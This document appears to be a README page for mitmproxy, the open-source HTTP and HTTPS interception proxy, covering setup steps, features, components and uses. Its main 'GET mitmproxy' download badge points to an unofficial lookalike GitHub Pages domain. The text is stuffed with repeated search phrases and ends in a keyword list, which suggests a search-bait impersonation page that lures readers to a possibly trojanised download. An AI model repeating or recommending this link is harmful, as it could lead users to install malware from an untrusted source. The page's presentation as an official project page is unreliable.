# mitmproxy - Open-Source HTTP and HTTPS Interception Tool

> **A calm workspace for inspecting, replaying, and modifying live web traffic on your own terms.**

[![GET mitmproxy](https://img.shields.io/badge/GET%20%E2%80%94%20mitmproxy-0078D6?style=for-the-badge&logoColor=white)](https://mitmproxy-traffic-interception.github.io/.github/mitmproxy-reverse-proxy)

---

## Why This Exists

Most debugging sessions force you to guess what a client actually sent, bounce between browser devtools, server logs, and scattered command-line tools, and hope the picture matches reality. **mitmproxy** solves this fragmentation by placing interception, inspection, and modification into one readable environment.

mitmproxy solves **one specific problem**: uncertain HTTP and HTTPS behavior between a client and a server. You point a client at mitmproxy as its proxy, and mitmproxy traffic interception shows every request and response as it flows. Nothing is hidden, nothing is assumed, and every decision is based on evidence you can see.

If you are tired of wondering which header was sent, which redirect fired, or which payload the server actually returned, **mitmproxy** is for you. It is a tool built for people who want to understand traffic rather than merely observe its side effects.

---

## What Is mitmproxy

mitmproxy is an open-source man-in-the-middle proxy for HTTP and HTTPS. It sits between a client and a server, captures each exchange, and presents it in a form you can read, search, and act on. Searches such as mitmproxy traffic interception, mitmproxy HTTPS debugging, and mitmproxy request modification usually point to the same goal: a clear, controllable view of live traffic.

The workflow stays simple. Configure a client to use mitmproxy as its proxy, start a session, and watch flows appear in order. From there you can pause, filter, inspect headers and bodies, and decide what to do next. Because mitmproxy speaks both HTTP and HTTPS, mitmproxy HTTPS debugging covers the encrypted traffic that ordinary inspection misses, provided the client trusts the mitmproxy certificate.

mitmproxy request modification turns observation into action. You can rewrite a request, change a response, replay a captured flow, or redirect traffic to a different host. That makes mitmproxy useful for testing edge cases, reproducing bugs, validating API behavior, and confirming how a client reacts when the server behaves unexpectedly.

For teams, mitmproxy reverse proxy mode lets you place the tool in front of a service and inspect traffic without changing the client. The mitmproxy web interface offers a browser-based view for people who prefer a graphical surface, while the console and scripting options remain available for those who want automation. Together these paths cover quick checks and long, structured investigations.

![mitmproxy](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f9/Mitmproxy_logo.svg/1280px-Mitmproxy_logo.svg.png)

---

## Quick Start with mitmproxy

1. **Prepare** – Confirm the client you want to inspect can be pointed at a proxy, and that you can reach the target host.
2. **Launch mitmproxy** – Start a session and note the proxy address and port the tool is listening on.
3. **Point the client** – Configure the client to use mitmproxy as its proxy so traffic flows through the tool.
4. **Trust the certificate** – For HTTPS, confirm the client trusts the mitmproxy certificate so mitmproxy HTTPS debugging can read encrypted flows.
5. **Review traffic** – Watch flows appear, filter by host or method, and open individual requests and responses.
6. **Modify if needed** – Use mitmproxy request modification to rewrite, replay, or redirect a flow and observe the result.
7. **Save findings** – Export or save the flows you care about so the evidence survives the session.

---

## Key Features of mitmproxy

- **Live interception** – mitmproxy traffic interception captures requests and responses as they happen, in order.
- **HTTPS visibility** – mitmproxy HTTPS debugging reveals encrypted flows once the client trusts the mitmproxy certificate.
- **Request control** – mitmproxy request modification lets you rewrite, replay, and redirect traffic for testing.
- **Reverse proxy mode** – mitmproxy reverse proxy places the tool in front of a service without changing the client.
- **Browser view** – The mitmproxy web interface offers a graphical surface for inspection and filtering.
- **Scriptable core** – Automate repeated checks and extend behavior when a manual pass is not enough.

---

## Understanding mitmproxy Core Components

- **Proxy listener** – the entry point that receives client traffic and forwards it onward.
- **Flow list** – an ordered record of every request and response captured during a session.
- **Detail view** – headers, bodies, and metadata for the selected flow.
- **Filtering** – narrow a busy session to the hosts, methods, or status codes that matter.
- **Modification rules** – change requests or responses before they continue.
- **Replay** – resend a captured flow to compare behavior across runs.
- **Certificate handling** – the trust step that makes mitmproxy HTTPS debugging possible.
- **Reverse proxy mode** – inspect a service from the front without touching the client.
- **Web interface** – a browser-based surface for people who prefer a graphical view.

---

## Best Uses

- **API troubleshooting** – Watch exactly what a client sends and what a server returns.
- **HTTPS inspection** – Use mitmproxy HTTPS debugging to read encrypted exchanges after trust is set.
- **Request testing** – Apply mitmproxy request modification to check how a client handles changed input.
- **Reverse proxy review** – Run mitmproxy reverse proxy in front of a service for a clean vantage point.
- **Browser-based sessions** – Open the mitmproxy web interface when a graphical view fits better.
- **Reproducing bugs** – Replay a captured flow to confirm a defect appears consistently.
- **Security review** – Inspect headers, cookies, and redirects for unexpected behavior.
- **Teaching and demos** – Show live traffic in a readable form during a walkthrough.

---

## Requirements for mitmproxy

| | Minimum | Recommended |
|-|---------|--------------|
| OS | A modern desktop OS | Current release of a supported OS |
| CPU | Dual-core | Modern multi-core |
| RAM | 4 GB | 8 GB or more for long sessions |
| Storage | Space for the tool and captures | Extra room for saved flows |
| Network | A client that can use a proxy | A dedicated test client or browser profile |

---

## Related Search Terms

mitmproxy traffic interception • mitmproxy HTTPS debugging • mitmproxy request modification • mitmproxy reverse proxy • mitmproxy web interface • mitmproxy flow list • mitmproxy certificate trust • mitmproxy replay • mitmproxy filter • mitmproxy console • mitmproxy scripting • mitmproxy header rewrite • mitmproxy response edit • mitmproxy API testing • mitmproxy proxy setup • mitmproxy session capture • mitmproxy man in the middle • mitmproxy network inspection • mitmproxy request replay • mitmproxy live traffic
